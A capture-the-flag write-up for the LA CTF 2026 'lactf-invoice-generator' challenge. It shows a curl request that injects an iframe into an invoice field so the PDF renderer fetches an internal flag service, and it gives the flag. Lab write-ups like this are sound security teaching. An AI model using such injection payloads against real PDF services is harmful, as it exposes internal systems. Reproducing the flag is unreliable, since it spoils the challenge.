# Challenge Name

lactf-invoice-generator

# Author

AVDestroyer

# Description

I need an itemized list of everything purchased for LA CTF 2026.

Deploy challenge

# Solution

Given the link to generate the pdf. An internal service hosting the flag is reachable at, http://flag:8081/flag. 
Exploit, inject an iframe into a user-controlled field. curl and make a payload to exploit the pdf to show the flag

````
curl -X POST 'https://lactf-invoice-generator-5mg95.instancer.lac.tf/generate-invoice' \
  -H 'Content-Type: application/json' \
  -d '{
    "name":"<iframe src=\"http://flag:8081/flag\"></iframe>",
    "item":"test",
    "cost":"1",
    "datePurchased":"2026-01-01"
  }' \
  -o invoice2.pdf
````

Once pdf generates, open the pdf and the flag is shown

# Flag

lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}

# Solved By

SniperKill258
